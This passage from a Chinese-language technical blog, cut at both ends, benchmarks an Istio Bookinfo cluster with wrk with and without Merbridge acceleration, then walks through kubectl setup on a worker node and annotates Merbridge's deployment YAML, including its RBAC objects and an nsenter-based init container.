52.72KB</span><br></pre></td></tr></table></figure><p>在node为<code>192.168.19.84</code>的机器上向node为<code>192.168.19.82</code>机器上的pod发送请求(有merbridge加速)</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:~# wrk -c1000 --latency http://192.168.19.82:31356/productpage</span><br><span class="line">Running 10s test @ http://192.168.19.82:31356/productpage</span><br><span class="line">  2 threads and 1000 connections</span><br><span class="line">  Thread Stats   Avg      Stdev     Max   +/- Stdev</span><br><span class="line">    Latency     1.65s   252.43ms   1.99s    53.33%</span><br><span class="line">    Req/Sec    20.50     14.91    70.00     67.33%</span><br><span class="line">  Latency Distribution</span><br><span class="line">     50%    1.71s</span><br><span class="line">     75%    1.92s</span><br><span class="line">     90%    1.97s</span><br><span class="line">     99%    1.99s</span><br><span class="line">  233 requests in 10.10s, 1.12MB read</span><br><span class="line">  Socket errors: connect 0, read 0, write 0, timeout 218</span><br><span class="line">Requests/sec:     23.08</span><br><span class="line">Transfer/sec:    113.95KB</span><br></pre></td></tr></table></figure><h6 id="集群间"><a href="#集群间" class="headerlink" title="集群间"></a>集群间</h6><p>在node为<code>192.168.19.85</code>的机器上向node为<code>192.168.19.84</code>机器上的pod发送请求(其中84上部署了merbridge加速)</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:~# wrk -c1000 --latency http://192.168.19.84:31356/productpage</span><br><span class="line">Running 10s test @ http://192.168.19.84:31356/productpage</span><br><span class="line">  2 threads and 1000 connections</span><br><span class="line">  Thread Stats   Avg      Stdev     Max   +/- Stdev</span><br><span class="line">    Latency     1.54s   365.46ms   1.96s    70.00%</span><br><span class="line">    Req/Sec    16.30     11.91    60.00     72.84%</span><br><span class="line">  Latency Distribution</span><br><span class="line">     50%    1.79s</span><br><span class="line">     75%    1.88s</span><br><span class="line">     90%    1.95s</span><br><span class="line">     99%    1.96s</span><br><span class="line">  157 requests in 10.10s, 770.66KB read</span><br><span class="line">  Socket errors: connect 0, read 0, write 0, timeout 137</span><br><span class="line">Requests/sec:     15.55</span><br><span class="line">Transfer/sec:     76.33KB</span><br></pre></td></tr></table></figure><p>在node为<code>192.168.19.84</code>的机器上向node为<code>192.168.19.85</code>机器上的pod发送请求(其中85没有部署merbridge加速)</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:~# wrk -c1000 --latency http://192.168.19.85:31356/productpage</span><br><span class="line">Running 10s test @ http://192.168.19.85:31356/productpage</span><br><span class="line">  2 threads and 1000 connections</span><br><span class="line">  Thread Stats   Avg      Stdev     Max   +/- Stdev</span><br><span class="line">    Latency     1.23s   671.98ms   1.82s   100.00%</span><br><span class="line">    Req/Sec    10.85      7.15    30.00     50.85%</span><br><span class="line">  Latency Distribution</span><br><span class="line">     50%    1.80s</span><br><span class="line">     75%    1.82s</span><br><span class="line">     90%    1.82s</span><br><span class="line">     99%    1.82s</span><br><span class="line">  84 requests in 10.10s, 412.15KB read</span><br><span class="line">  Socket errors: connect 0, read 0, write 0, timeout 80</span><br><span class="line">Requests/sec:      8.32</span><br><span class="line">Transfer/sec:     40.81KB</span><br></pre></td></tr></table></figure><h5 id="同一node下pod间发送请求"><a href="#同一node下pod间发送请求" class="headerlink" title="同一node下pod间发送请求"></a>同一node下pod间发送请求</h5><h6 id="pod内安装wrk"><a href="#pod内安装wrk" class="headerlink" title="pod内安装wrk"></a>pod内安装wrk</h6><p>进入pod</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kubectl exec -it &lt;pod-name&gt; /bin/sh</span><br></pre></td></tr></table></figure><p>安装wrk压测工具发现无法执行命令</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">/ $ ls</span><br><span class="line">bin            dev            etc            lib            mnt            proc           run            srv            tmp            var</span><br><span class="line">cacert.pem     entrypoint.sh  home           media          opt            root           sbin           sys            usr</span><br><span class="line">/ $ sudo</span><br><span class="line">/bin/sh: sudo: not found</span><br><span class="line">/ $ apt</span><br><span class="line">/bin/sh: apt: not found</span><br></pre></td></tr></table></figure><p>解决办法：<a href="https://stackoverflow.com/questions/45142855/bin-sh-apt-get-not-found" target="_blank" rel="noopener">https://stackoverflow.com/questions/45142855/bin-sh-apt-get-not-found</a></p><p>通过docker以root身份进入容器</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker exec -it --user=root &lt;CONTAINER ID&gt; /bin/sh</span><br></pre></td></tr></table></figure><p>使用apk命令安装</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">/ # apk update</span><br><span class="line">/ # apk add Package</span><br><span class="line">这里需要安装的package如下</span><br><span class="line">- gcc</span><br><span class="line">- make</span><br><span class="line">- automake</span><br><span class="line">- autoconf</span><br><span class="line">- libtool</span><br><span class="line">- linux-headers</span><br><span class="line">- libc-dev</span><br></pre></td></tr></table></figure><p>在wrk目录下执行make</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/tmp/wrk-master # make</span><br></pre></td></tr></table></figure><p>在名为<code>sleep-698cfc4445-k8ncb</code>的pod下，对名为<code>helloworld-v1-fdb8c8c58-gh4sf</code>的pod发起请求。这两个pod同属于<code>192.168.19.83</code>节点，在该node下没有部署merbridge加速</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">/tmp/wrk-master # wrk -c10000 --latency http://10.101.180.145:5000</span><br><span class="line">Running 10s test @ http://10.101.180.145:5000</span><br><span class="line">  2 threads and 10000 connections</span><br><span class="line">  Thread Stats   Avg      Stdev     Max   +/- Stdev</span><br><span class="line">    Latency   757.70ms  403.53ms   1.54s    51.72%</span><br><span class="line">    Req/Sec    20.85     30.78   170.00     94.87%</span><br><span class="line">  Latency Distribution</span><br><span class="line">     50%  724.43ms</span><br><span class="line">     75%    1.09s</span><br><span class="line">     90%    1.31s</span><br><span class="line">     99%    1.54s</span><br><span class="line">  136 requests in 10.22s, 52.28KB read</span><br><span class="line">  Socket errors: connect 0, read 0, write 0, timeout 107</span><br><span class="line">  Non-2xx or 3xx responses: 136</span><br><span class="line">Requests/sec:     13.31</span><br><span class="line">Transfer/sec:      5.12KB</span><br></pre></td></tr></table></figure><p>在名为<code>sleep-698cfc4445-qncjl</code>的pod下，对名为<code>helloworld-v1-fdb8c8c58-28pm4</code>的pod发起请求。这两个pod同属于<code>192.168.19.82</code>节点，在该node部署了merbridge加速</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">/tmp/wrk-master # wrk -c10000 --latency http://10.101.187.77:5000</span><br><span class="line">Running 10s test @ http://10.101.187.77:5000</span><br><span class="line">  2 threads and 10000 connections</span><br><span class="line">  Thread Stats   Avg      Stdev     Max   +/- Stdev</span><br><span class="line">    Latency     1.91s    20.63ms   1.98s    82.22%</span><br><span class="line">    Req/Sec    78.02     96.83   495.00     86.67%</span><br><span class="line">  Latency Distribution</span><br><span class="line">     50%    1.92s</span><br><span class="line">     75%    1.92s</span><br><span class="line">     90%    1.92s</span><br><span class="line">     99%    1.98s</span><br><span class="line">  461 requests in 10.10s, 177.23KB read</span><br><span class="line">  Socket errors: connect 0, read 0, write 0, timeout 416</span><br><span class="line">  Non-2xx or 3xx responses: 461</span><br><span class="line">Requests/sec:     45.67</span><br><span class="line">Transfer/sec:     17.56KB</span><br></pre></td></tr></table></figure><h5 id="不同node下pod间发送请求"><a href="#不同node下pod间发送请求" class="headerlink" title="不同node下pod间发送请求"></a>不同node下pod间发送请求</h5><p>在node为<code>192.168.19.83名为sleep-698cfc4445-k8ncb</code>的pod下，对node为<code>192.168.19.85名为productpage-v1-65b75f6885-p6k2w</code>的pod发起请求。这两个pod不属于同一个node下，在该集群下没有部署merbridge加速</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">/ $ wrk -c1000 --latency http://192.168.19.85:31356/productpage</span><br><span class="line">Running 10s test @ http://192.168.19.85:31356/productpage</span><br><span class="line">  2 threads and 1000 connections</span><br><span class="line">  Thread Stats   Avg      Stdev     Max   +/- Stdev</span><br><span class="line">    Latency     1.69s     0.00us   1.69s   100.00%</span><br><span class="line">    Req/Sec     5.98      4.32    20.00     75.47%</span><br><span class="line">  Latency Distribution</span><br><span class="line">     50%    1.69s</span><br><span class="line">     75%    1.69s</span><br><span class="line">     90%    1.69s</span><br><span class="line">     99%    1.69s</span><br><span class="line">  62 requests in 10.04s, 304.85KB read</span><br><span class="line">  Socket errors: connect 0, read 0, write 0, timeout 61</span><br><span class="line">Requests/sec:      6.17</span><br><span class="line">Transfer/sec:     30.35KB</span><br></pre></td></tr></table></figure><p>在node为<code>192.168.19.82名为sleep-698cfc4445-qncjl</code>的pod下，对node为<code>192.168.19.84名为productpage-v1-65b75f6885-kt88j</code>的pod发起请求。这两个pod不属于同一个node下，在该集群下部署了merbridge加速</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">/ $ wrk -c1000 --latency http://192.168.19.84:31356/productpage</span><br><span class="line">Running 10s test @ http://192.168.19.84:31356/productpage</span><br><span class="line">  2 threads and 1000 connections</span><br><span class="line">  Thread Stats   Avg      Stdev     Max   +/- Stdev</span><br><span class="line">    Latency     1.48s   258.10ms   1.80s    83.33%</span><br><span class="line">    Req/Sec    15.02     14.04    90.00     84.54%</span><br><span class="line">  Latency Distribution</span><br><span class="line">     50%    1.58s</span><br><span class="line">     75%    1.64s</span><br><span class="line">     90%    1.69s</span><br><span class="line">     99%    1.80s</span><br><span class="line">  188 requests in 10.08s, 0.90MB read</span><br><span class="line">  Socket errors: connect 0, read 0, write 0, timeout 158</span><br><span class="line">Requests/sec:     18.66</span><br><span class="line">Transfer/sec:     91.41KB</span><br></pre></td></tr></table></figure><h5 id="拓展：从控制平面节点以外的计算机控制集群"><a href="#拓展：从控制平面节点以外的计算机控制集群" class="headerlink" title="拓展：从控制平面节点以外的计算机控制集群"></a>拓展：从控制平面节点以外的计算机控制集群</h5><p>从节点查看pod报错如下</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:~# kubectl get pod</span><br><span class="line">The connection to the server localhost:8080 was refused - did you specify the right host or port?</span><br></pre></td></tr></table></figure><p>出现这个问题的原因是kubectl命令需要使用<code>kubernetes-admin</code>来运行，解决方法如下，将主节点中的<code>/etc/kubernetes/admin.conf</code>文件拷贝到从节点相同目录下，然后配置环境变量</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:~# echo "export KUBECONFIG=/etc/kubernetes/admin.conf" &gt;&gt; ~/.bash_profile</span><br><span class="line">root@ubuntu:~# source ~/.bash_profile</span><br></pre></td></tr></table></figure><p>再次查看pod</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:~# kubectl get pods</span><br><span class="line">NAME                              READY   STATUS    RESTARTS   AGE</span><br><span class="line">details-v1-5498c86cf5-bhv2h       2/2     Running   24         11d</span><br><span class="line">helloworld-v1-fdb8c8c58-9nqw8     2/2     Running   0          5d</span><br><span class="line">helloworld-v2-5b46bc9f84-gdzvl    2/2     Running   0          5d</span><br><span class="line">productpage-v1-65b75f6885-p6k2w   2/2     Running   24         11d</span><br><span class="line">ratings-v1-b477cf6cf-k84kr        2/2     Running   24         11d</span><br><span class="line">reviews-v1-79d546878f-q6f62       2/2     Running   24         11d</span><br><span class="line">reviews-v2-548c57f459-cqq2r       2/2     Running   24         11d</span><br><span class="line">reviews-v3-6dd79655b9-gr42h       2/2     Running   24         11d</span><br><span class="line">sleep-698cfc4445-8nncn            2/2     Running   0          5d1h</span><br></pre></td></tr></table></figure><h4 id="merbridge-yaml文件解析-istio"><a href="#merbridge-yaml文件解析-istio" class="headerlink" title="merbridge yaml文件解析(istio)"></a>merbridge yaml文件解析(istio)</h4><p><a href="https://github.com/merbridge/merbridge/blob/main/deploy/all-in-one.yaml" target="_blank" rel="noopener">https://github.com/merbridge/merbridge/blob/main/deploy/all-in-one.yaml</a></p><p>第一段，创建对象类别，这里是集群角色</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">apiVersion: rbac.authorization.k8s.io/v1 #创建该对象所使用的 Kubernetes API 的版本</span><br><span class="line">kind: ClusterRole #想要创建对象的类别</span><br><span class="line">metadata: #帮助唯一性标识对象的一些数据</span><br><span class="line">  labels:</span><br><span class="line">    app: merbridge</span><br><span class="line">  name: merbridge</span><br><span class="line">rules:</span><br><span class="line">- apiGroups: #空字符串表明使用core API group</span><br><span class="line">  - ""</span><br><span class="line">  resources:</span><br><span class="line">  - pods</span><br><span class="line">  verbs: #对资源对象执行的操作</span><br><span class="line">  - list</span><br><span class="line">  - get</span><br><span class="line">  - watch</span><br></pre></td></tr></table></figure><p>第二段，在集群范围执行授权，这里对集群角色权限进行绑定</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">apiVersion: rbac.authorization.k8s.io/v1</span><br><span class="line">kind: ClusterRoleBinding #在集群范围执行授权</span><br><span class="line">metadata:</span><br><span class="line">  labels:</span><br><span class="line">    app: merbridge</span><br><span class="line">  name: merbridge</span><br><span class="line">roleRef: #指定与某 Role 或 ClusterRole 的绑定关系</span><br><span class="line">  apiGroup: rbac.authorization.k8s.io</span><br><span class="line">  kind: ClusterRole # 此字段必须是 Role 或 ClusterRole</span><br><span class="line">  name: merbridge # 此字段必须与你要绑定的 Role 或 ClusterRole 的名称匹配</span><br><span class="line">subjects: #用来尝试操作集群的对象</span><br><span class="line">- kind: ServiceAccount #为Pod中的进程和外部用户提供身份信息</span><br><span class="line">  name: merbridge</span><br><span class="line">  namespace: istio-system</span><br></pre></td></tr></table></figure><p>第三段，为pod指定服务账户，命名空间为<code>istio-system</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">apiVersion: v1</span><br><span class="line">kind: ServiceAccount</span><br><span class="line">metadata:</span><br><span class="line">  labels:</span><br><span class="line">    app: merbridge</span><br><span class="line">  name: merbridge</span><br><span class="line">  namespace: istio-system</span><br></pre></td></tr></table></figure><p>第四段创建DaemonSet类型的pod。我们将内容拆为两部分说明</p><p><code>initContainers</code></p><p>首先我们看一下<code>initContainers</code>的挂载卷，需要说明的是，使用卷时, 在 <code>.spec.volumes</code> 字段中设置为 Pod 提供的卷，并在 <code>.spec.containers[*].volumeMounts</code> 字段中声明卷在容器中的挂载位置。因此我们先看一下<code>.spec.volumes</code>字段，如下所示</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">volumes:</span><br><span class="line">      - hostPath: </span><br><span class="line">          path: /sys/fs</span><br><span class="line">        name: sys-fs</span><br><span class="line">      - hostPath:</span><br><span class="line">          path: /proc</span><br><span class="line">        name: host-proc</span><br><span class="line">      - emptyDir: &#123;&#125; </span><br><span class="line">        name: host-ips</span><br></pre></td></tr></table></figure><p>这里用到了两种存储卷类型，分别是<code>hostPath</code>和<code>emptyDir</code>。对于<code>hostPath</code>类型，会映射node文件系统中的文件或者目录到pod里。而对于<code>emptyDir</code>类型，K8s会在Node上自动分配一个目录，因此无需指定宿主机Node上对应的目录文件。</p><p>接着我们回到<code>initContainers</code>中。看到<code>initContainers</code>有两个<code>mountPath</code>。用到了<code>.spec.volumes</code>下的<code>host-ips</code>和<code>host-proc</code>，挂载路径为容器中的<code>/host/ips</code>和<code>/host/proc</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">initContainers: #Init容器是一种特殊容器，在Pod内的应用容器启动之前运行</span><br><span class="line">      - image: ghcr.io/merbridge/merbridge:latest</span><br><span class="line">        imagePullPolicy: Always</span><br><span class="line">        name: init</span><br><span class="line">        args:</span><br><span class="line">        - sh</span><br><span class="line">        - -c</span><br><span class="line">        - nsenter --net=/host/proc/1/ns/net ip -o addr | awk '&#123;print $4&#125;' | tee /host/ips/ips.txt</span><br><span class="line">        resources: </span><br><span class="line">          requests:</span><br><span class="line">            cpu: 100m</span><br><span class="line">            memory: 50Mi</span><br><span class="line">          limits:</span><br><span class="line">            cpu: 300m</span><br><span class="line">            memory: 50Mi</span><br><span class="line">        securityContext:</span><br><span class="line">          privileged: true</span><br><span class="line">        volumeMounts:</span><br><span class="line">          - mountPath: /host/ips </span><br><span class="line">            name: host-ips</span><br><span class="line">          - mountPath: /host/proc</span><br><span class="line">            name: host-proc</span><br></pre></td></tr></table></figure><p>挂载完成后，我们看一下执行参数。这里用到了<code>nsenter</code>命令。nsenter命令是一个可以在指定进程的命令空间下运行指定程序的命令。它位于util-linux包中。<br>具体使用可参考如下连接：<a href="https://juejin.cn/post/7038531145113452581" target="_blank" rel="noopener">https://juejin.cn/post/7038531145113452581</a><br><code>--net</code>进入<code>net</code>命令空间，并指定了文件的命令空间。<code>nsenter --net=/host/proc/1/ns/net ip -o addr</code>命令可以查看主机的ip地址信息。在主机上测试如下</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:~# nsenter --net=/proc/1/ns/net ip -o addr</span><br><span class="line">1: lo    inet 127.0.0.1/8 scope host lo\       valid_lft forever preferred_lft forever</span><br><span class="line">1: lo    inet6 ::1/128 scope host \       valid_lft forever preferred_lft forever</span><br><span class="line">2: ens160    inet 192.168.19.84/16 brd 192.168.255.255 scope global ens160\       valid_lft forever preferred_lft forever</span><br><span class="line">2: ens160    inet6 fe80::250:56ff:fe82:8bd7/64 scope link \       valid_lft forever preferred_lft forever</span><br><span class="line">3: docker0    inet 172.17.0.1/16 brd 172.17.255.255 scope global docker0\       valid_lft forever preferred_lft forever</span><br><span class="line">3: docker0    inet6 fe80::42:8aff:fe54:fa57/64 scope link \       valid_lft forever preferred_lft forever</span><br><span class="line">4: flannel.1    inet 10.244.0.0/32 scope global flannel.1\       valid_lft forever preferred_lft forever</span><br><span class="line">4: flannel.1    inet6 fe80::e4a0:b4ff:fe2e:2c1f/64 scope link \       valid_lft forever preferred_lft forever</span><br><span class="line">5: cni0    inet 10.244.0.1/24 brd 10.244.0.255 scope global cni0\       valid_lft forever preferred_lft forever</span><br><span class="line">5: cni0    inet6 fe80::a4b8:52ff:fef8:6b8a/64 scope link \       valid_lft forever preferred_lft forever</span><br><span class="line">6: vethffb04bf6    inet6 fe80::24c6:d7ff:fe20:b8b7/64 scope link \       valid_lft forever preferred_lft forever</span><br><span class="line">7: vethf2b12fbf    inet6 fe80::e83b:a4ff:fe7b:7321/64 scope link \       valid_lft forever preferred_lft forever</span><br><span class="line">8: vethec8e53c3    inet6 fe80::d44b:31ff:fe17:a41c/64 scope link \       valid_lft forever preferred_lft forever</span><br><span class="line">9: vethfa223ce0    inet6 fe80::5855:4fff:feef:92f0/64 scope link \       valid_lft forever preferred_lft forever</span><br><span class="line">10: vethcbd6c656    inet6 fe80::c09c:62ff:fe21:df97/64 scope link \       valid_lft forever preferred_lft forever</span><br><span class="line">11: vethf18457c5    inet6 fe80::b8ba:35ff:fe1f:505f/64 scope link \       valid_lft forever preferred_lft forever</span><br><span class="line">12: veth4bbafc0f    inet6 fe80::186e:7aff:fe98:59e4/64 scope link \       valid_lft forever preferred_lft forever</span><br><span class="line">13: veth2757e288    inet6 fe80::4cb5:dff:fea6:d245/64 scope link \       valid_lft forever preferred_lft forever</span><br><span class="line">14: veth40c1c447    inet6 fe80::4468:7bff:fe40:6b09/64 scope link \       valid_lft forever preferred_lft forever</span><br><span class="line">15: vethc01359c4    inet6 fe80::61:aeff:fece:58ee/64 scope link \       valid_lft forever preferred_lft forever</span><br><span class="line">16: vethf3f6e93e    inet6 fe80::30ee:22ff:fee8:2fee/64 scope link \       valid_lft forever preferred_lft forever</span><br></pre></td></tr></table></figure><p>这里有人可能会想为什么不直接使用<code>ip -o addr</code>呢，从下面结果看到这两条命令的执行结果是一样的。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:~# ip -o addr | awk '&#123;print $4&#125;'</span><br><span class="line">127.0.0.1/8</span><br><span class="line">::1/128</span><br><span class="line">192.168.19.84/16</span><br><span class="line">fe80::250:56ff:fe82:8bd7/64</span><br><span class="line">172.17.0.1/16</span><br><span class="line">fe80::42:8aff:fe54:fa57/64</span><br><span class="line">10.244.0.0/32</span><br><span class="line">fe80::e4a0:b4ff:fe2e:2c1f/64</span><br><span class="line">10.244.0.1/24</span><br><span class="line">fe80::a4b8:52ff:fef8:6b8a/64</span><br><span class="line">fe80::24c6:d7ff:fe20:b8b7/64</span><br><span class="line">fe80::e83b:a4ff:fe7b:7321/64</span><br><span class="line">fe80::d44b:31ff:fe17:a41c/64</span><br><span class="line">fe80::5855:4fff:feef:92f0/64</span><br><span class="line">fe80::c09c:62ff:fe21:df97/64</span><br><span class="line">fe80::b8ba:35ff:fe1f:505f/64</span><br><span class="line">fe80::186e:7aff:fe98:59e4/64</span><br><span class="line">fe80::4cb5:dff:fea6:d245/64</span><br><span class="line">fe80::4468:7bff:fe40:6b09/64</span><br><span class="line">fe80::61:aeff:fece:58ee/64</span><br><span class="line">fe80::30ee:22ff:fee8:2fee/64</span><br><span class="line">root@ubuntu:~# nsenter --net=/proc/1/ns/net ip -o addr | awk '&#123;print $4&#125;'</span><br><span class="line">127.0.0.1/8</span><br><span class="line">::1/128</span><br><span class="line">192.168.19.84/16</span><br><span class="line">fe80::250:56ff:fe82:8bd7/64</span><br><span class="line">172.17.0.1/16</span><br><span class="line">fe80::42:8aff:fe54:fa57/64</span><br><span class="line">10.244.0.0/32</span><br><span class="line">fe80::e4a0:b4ff:fe2e:2c1f/64</span><br><span class="line">10.244.0.1/24</span><br><span class="line">fe80::a4b8:52ff:fef8:6b8a/64</span><br><span class="line">fe80::24c6:d7ff:fe20:b8b7/64</span><br><span class="line">fe80::e83b:a4ff:fe7b:7321/64</span><br><span class="line">fe80::d44b:31ff:fe17:a41c/64</span><br><span class="line">fe80::5855:4fff:feef:92f0/64</span><br><span class="line">fe80::c09c:62ff:fe21:df97/64</span><br><span class="line">fe80::b8ba:35ff:fe1f:505f/64</span><br><span class="line">fe80::186e:7aff:fe98:59e4/64</span><br><span class="line">fe80::4cb5:dff:fea6:d245/64</span><br><span class="line">fe80::4468:7bff:fe40:6b09/64</span><br><span class="line">fe80::61:aeff:fece:58ee/64</span><br><span class="line">fe80::30ee:22ff:fee8:2fee/64</span><br></pre></td></tr></table></figure><p>需要提一点的是，nsenter命令一个最典型的用途就是进入容器的网络命令空间。相当多的容器为了轻量级，是不包含较为基础的命令的，比如说<code>ip address</code>，<code>ping</code>，<code>telnet</code>，<code>ss</code>，<code>tcpdump</code>等等命令，这就给调试容器网络带来相当大的困扰。</p><p><code>awk &#39;{print $4}&#39;</code>，这句命令是对每行按照空格或TAB分割，输出第四项</p><p>awk用法：<a href="https://www.runoob.com/linux/linux-comm-awk.html" target="_blank" rel="noopener">https://www.runoob.com/linux/linux-comm-awk.html</a></p><p>主机测试如下</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span 